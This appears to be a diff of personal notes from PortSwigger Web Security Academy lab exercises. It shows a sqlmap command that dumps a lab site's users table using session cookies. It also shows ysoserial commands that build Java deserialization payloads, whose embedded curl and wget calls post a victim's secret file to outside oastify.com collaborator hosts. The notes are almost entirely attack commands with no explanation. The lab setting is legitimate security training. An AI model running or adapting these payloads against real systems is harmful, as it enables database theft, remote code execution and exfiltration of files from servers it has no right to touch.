@@ -26,3 +26,11 @@ sqlmap -u "https://0aa2002403285f85c21ed0d400d2002a.web-security-academy.net/fil
 
 
 -u "https://0aa2002403285f85c21ed0d400d2002a.web-security-academy.net:443/filtered_search?SearchTerm=test&sort-by=*&writer=" --level=2 --dbms="PostgreSQL" --technique=ETSB --cookie="_lab=46%7cMCwCFFrmCdH%2bBPSw605SnnddEyaRrjopAhRsn1%2fdvu1nnAMhzcKEAJH09IxfZlDz3Dofj9NnU6tFPzLQg317TH7mFGDlqgDTPMw02ZCaxZU1TqUfHYOt3RWYdIftlywBAfU6j8vMHadxslfGMMV8AAQqAtwl4h1OoIT0csiE7NTxRsc%3d;session=wjXQ2Nk7b8OEJ97WK5eKqFqjcrsnyELD" --batch --random-agent -v --level=2 -T users --dump
+
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo java -jar ysoserial-all.jar CommonsCollections6  'curl -d @/home/carlos/secret mlbxbtkqg8bcffd92qei1nwcw32uqreg.oastify.com' | gzip -f | base64 -w0
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo java -jar ysoserial-all.jar CommonsCollections6  'cat /home/carlos/secret' | gzip -f | base64 -w0
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo java -jar ysoserial-all.jar CommonsCollections5 'wget --post-file /home/carlos/secret ynp9d5m2ikdohrfl42gu3zyoyf46s2gr.oastify.com' | gzip -f | base64 -w0
